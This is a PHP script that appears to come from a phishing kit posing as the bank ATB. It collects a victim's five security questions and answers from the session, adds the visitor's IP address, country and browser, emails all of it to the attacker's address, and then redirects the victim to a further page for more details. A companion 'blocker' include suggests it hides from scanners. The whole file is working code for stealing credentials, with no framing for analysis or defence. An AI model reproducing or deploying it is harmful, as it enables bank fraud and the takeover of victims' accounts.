<?php
    session_start();
    include 'email.php';
	include 'blocker.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];

    $subject = 'ATB Q/A [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ ATB Q&A ===========|'."\r\n";
    $message .= '|Question 1:  '.$_SESSION['question1']."\r\n";
    $message .= '|Answer 1:   '.$_SESSION['answer1']."\r\n";
	$message .= '|Question 2:  '.$_SESSION['question2']."\r\n";
    $message .= '|Answer 2:   '.$_SESSION['answer2']."\r\n";
	$message .= '|Question 3:  '.$_SESSION['question3']."\r\n";
    $message .= '|Answer 3:   '.$_SESSION['answer3']."\r\n";
	$message .= '|Question 4:  '.$_SESSION['question4']."\r\n";
    $message .= '|Answer 4:   '.$_SESSION['answer4']."\r\n";
	$message .= '|Question 5:  '.$_SESSION['question5']."\r\n";
    $message .= '|Answer 5:   '.$_SESSION['answer5']."\r\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    
	if($_SESSION['answer1'] != "" || $_SESSION['answer2'] !=""){
	mail($to, $subject, $message);
	}
	
	
    header("Location: details.php");
 ?>